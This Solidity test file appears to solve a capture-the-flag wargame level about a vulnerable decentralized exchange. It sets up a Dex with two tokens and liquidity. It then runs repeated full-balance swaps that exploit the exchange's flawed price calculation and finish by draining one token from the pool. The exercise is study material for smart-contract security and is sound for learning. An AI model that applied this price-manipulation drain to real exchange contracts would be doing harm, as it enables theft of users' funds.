// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Level22.sol";

contract Level22Test is Test {
    Dex public dex;
    SwappableToken public token1;
    SwappableToken public token2;
    address bob = vm.addr(1);
    address tk1; 
    address tk2;

    function setUp() public {
      // Add ether
      vm.deal(bob, 6 ether);

      //Initialize dex
      vm.startPrank(bob);
      dex = new Dex();
      token1 = new SwappableToken(address(dex), "Token1", "TK1", 110);
      token2 = new SwappableToken(address(dex), "Token2", "TK2", 110);
      tk1 = address(token1);
      tk2 = address(token2);

      // Set tokens, approve and add liquidity
      dex.setTokens(tk1, tk2);
      dex.approve(address(dex), 100);
      dex.addLiquidity(tk1, 100 );
      dex.addLiquidity(tk2, 100 );

      //Fund test account
      token1.transfer(bob, 10 );
      token2.transfer(bob, 10 );


      console.log("Test account");
      console.log("TK1", token1.balanceOf(bob));
      console.log("TK2", token2.balanceOf(bob));
      console.log("Dex");
      console.log("TK2", token1.balanceOf(address(dex)));
      console.log("TK2", token2.balanceOf(address(dex)));
      vm.stopPrank();

    }

    function testLevel22() public {
      vm.startPrank(bob);

      dex.approve(address(dex), 100000);

      //TODO: refactor to cleaner code
      
      for (uint i = 0; i < 2 ; i++) {
        dex.swap(tk2, tk1, token2.balanceOf(bob));
        dex.swap(tk1, tk2, token1.balanceOf(bob));
        console.log('i', i);
      }
      dex.swap(tk2, tk1, token2.balanceOf(bob));

      uint256 maxWithdrawPossible = dex.getSwapPrice(tk2, tk1, token2.balanceOf(address(dex)));
      console.log('maxWithdrawPossible: ', maxWithdrawPossible);
      dex.swap(tk1, tk2, maxWithdrawPossible);
      console.log("TK1", token1.balanceOf(bob));
      console.log("TK2", token2.balanceOf(bob));
      vm.stopPrank();
    }
}
